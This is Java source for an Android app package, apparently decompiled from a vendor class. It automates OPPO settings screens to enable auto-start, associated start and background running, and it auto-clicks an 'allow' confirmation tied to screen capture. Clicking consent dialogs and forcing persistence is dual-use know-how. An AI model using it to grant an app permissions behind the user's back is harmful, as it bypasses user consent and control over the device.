package com.guard.wallet.delegate.task;

import com.guard.wallet.core.AppUtils;

import android.util.Log;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.delegate.FilterHelper;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import java.util.Objects;

/**
 * OPPO 引擎投屏/保活权限 Task。
 *
 * vendor 原始路径: o/u.java (171 行)
 * 功能: 5 个 case — keepAliveInAppDetail / keepAliveInPowerControl /
 *       checkInAndroidXDialog / keepAliveInStartup / 默认 Z()。
 */
public final class MediaProjectionTask implements Runnable {
    public final int a;
    public final com.guard.wallet.engine.OppoEngine b;

    public MediaProjectionTask(com.guard.wallet.engine.OppoEngine vVar, int i2) {
        this.a = i2;
        this.b = vVar;
    }

    @Override
    public final void run() {
        int i2 = this.a;
        com.guard.wallet.engine.OppoEngine vVar = this.b;
        switch (i2) {
            case 0:
                /* keepAliveInAppDetail — find and click battery management item */
                vVar.getClass();
                try {
                    if (!vVar.isInAppDetailWindow()) {
                        return;
                    }
                    Log.e("o.v", "keepAliveInAppDetail 窗口匹配");
                    com.guard.wallet.helper.BlockViewManager.h(10);
                    vVar.G();
                    Log.e("o.v", "active root complete");
                    UiObject Q = vVar.findScrollableContainer();
                    CombineFilter B0 = com.guard.wallet.engine.OppoEngine.buildPowerManageFilter();
                    CombineFilter C0 = com.guard.wallet.engine.OppoEngine.buildPowerManage2Filter();
                    UiObject uiObject = null;
                    if (Q != null) {
                        Log.e("o.v", "应用详情窗口滚动视图查找成功");
                        com.guard.wallet.helper.BlockViewManager.h(15);
                        if (B0 != null) {
                            UiObject scrollForwardUtil = FilterHelper.scrollForwardUtilFilter(Q, B0);
                            uiObject = scrollForwardUtil == null ? FilterHelper.scrollBackwardUtilFilter(Q, B0) : scrollForwardUtil;
                        }
                        if (uiObject == null && C0 != null) {
                            UiObject scrollBackwardUtil = FilterHelper.scrollBackwardUtilFilter(Q, C0);
                            uiObject = scrollBackwardUtil == null ? FilterHelper.scrollForwardUtilFilter(Q, C0) : scrollBackwardUtil;
                        }
                    }
                    if (uiObject == null && vVar.k() != null) {
                        Log.e("o.v", "应用详情窗口滚动视图查找失败");
                        if (B0 != null) {
                            uiObject = vVar.k().findOneByCombine(B0);
                        }
                        if (uiObject == null && C0 != null) {
                            uiObject = vVar.k().findOneByCombine(C0);
                        }
                    }
                    if (uiObject != null && uiObject.click()) {
                        Log.e("o.v", "查找并点击耗电管理栏目成功");
                        com.guard.wallet.helper.BlockViewManager.h(30);
                        return;
                    }
                    Log.e("o.v", "查找并点击耗电管理栏目失败");
                    return;
                } catch (Exception e2) {
                    AppUtils.s("o.v", e2);
                    return;
                }

            case 1:
                /* keepAliveInPowerControl — enable self-start, associate start, background */
                vVar.getClass();
                try {
                    if (!vVar.isInPowerControlWindow()) {
                        return;
                    }
                    Log.e("o.v", "keepAliveInPowerControl 窗口匹配");
                    com.guard.wallet.helper.BlockViewManager.h(40);
                    // ADAPT: 等待 UI 渲染 — 从 App 详情点击"耗电管理"后页面切换需要时间
                    // 参考 android 项目 handlePowerControlState(): sleep(1500)
                    com.guard.wallet.utils.SystemHelper.T0(15);
                    vVar.G();
                    Log.e("o.v", "active root complete");
                    // ADAPT: ColorOS 16 已移除自启动和关联启动开关，失败不阻塞
                    if (!vVar.toggleAutoStart()) {
                        Log.e("o.v", "允许自启动栏目不存在或操作失败 (ColorOS 16 可能已移除)");
                    }
                    com.guard.wallet.helper.BlockViewManager.h(50);
                    if (!vVar.toggleRelateStart()) {
                        Log.e("o.v", "允许关联启动栏目不存在或操作失败 (ColorOS 16 可能已移除)");
                    }
                    com.guard.wallet.helper.BlockViewManager.h(60);
                    if (!vVar.toggleFullBackground()) {
                        Log.e("o.v", "允许完全后台行为失败，仍继续后续流程");
                    }
                    com.guard.wallet.helper.BlockViewManager.h(70);
                    // ADAPT: 无论开关操作是否成功，都调用 u0() 完成流程
                    vVar.u0();
                    return;
                } catch (Exception e3) {
                    AppUtils.s("o.v", e3);
                    return;
                }

            case 2:
                /* checkInAndroidXDialog — click allow confirm button */
                vVar.getClass();
                try {
                    if (!vVar.isInAllowConfirmDialog()) {
                        return;
                    }
                    Log.e("o.v", "checkInAndroidXDialog 窗口匹配");
                    com.guard.wallet.helper.BlockViewManager.h(80);
                    vVar.G();
                    Log.e("o.v", "active root complete");
                    try {
                        UiObject findOneByCombineLoop = vVar.k().findOneByCombineLoop(com.guard.wallet.engine.OppoEngine.buildAllowConfirmFilter());
                        if (findOneByCombineLoop != null && findOneByCombineLoop.click()) {
                            Log.e("o.v", "查找并点击允许确认按钮完成");
                            com.guard.wallet.helper.BlockViewManager.h(90);
                        } else {
                            Log.e("o.v", "查找并点击允许确认按钮失败");
                        }
                    } catch (Exception e4) {
                        AppUtils.s("o.v", e4);
                    }
                    return;
                } catch (Exception e5) {
                    AppUtils.s("o.v", e5);
                    return;
                }

            case 3:
                /* keepAliveInStartup — find and toggle auto-start checkbox */
                vVar.getClass();
                try {
                    if (!vVar.isInStartupWindow()) {
                        return;
                    }
                    vVar.G();
                    Log.e("o.v", "active root complete");
                    String x02 = Objects.equals(vVar.r.get(), com.guard.wallet.delegate.ScreenCaptureManager.e.c) ? com.guard.wallet.utils.SystemHelper.x0() : com.guard.wallet.utils.SystemHelper.e();
                    Log.e("o.v", "keepAliveInStartup 窗口匹配");
                    UiObject Q2 = vVar.findScrollableContainer();
                    CombineFilterWithChild combineFilterWithChild = new CombineFilterWithChild(com.guard.wallet.engine.KeepAliveEngine.buildClickableLinearLayoutFilter(), com.guard.wallet.engine.KeepAliveEngine.buildTextContainsFilter(x02));
                    UiObject scrollForwardUtil2 = Q2 != null ? Q2.scrollForwardUtil(FilterHelper.createScrollCondition(combineFilterWithChild, 0, 0)) : vVar.k().findOneByCombineWithChild(combineFilterWithChild);
                    if (scrollForwardUtil2 != null) {
                        CheckedResult R = vVar.toggleSwitchWithRetry(scrollForwardUtil2, 5);
                        if (R.isClicked()) {
                            Log.e("o.v", "已点击自启动");
                        }
                        if (!R.isChecked()) {
                            Log.e("o.v", "未勾选自启动");
                            return;
                        }
                        Log.e("o.v", "已勾选自启动");
                        vVar.t.set(true);
                        return;
                    }
                    return;
                } catch (Exception e6) {
                    AppUtils.s("o.v", e6);
                    return;
                }

            default:
                vVar.Z();
                return;
        }
    }
}
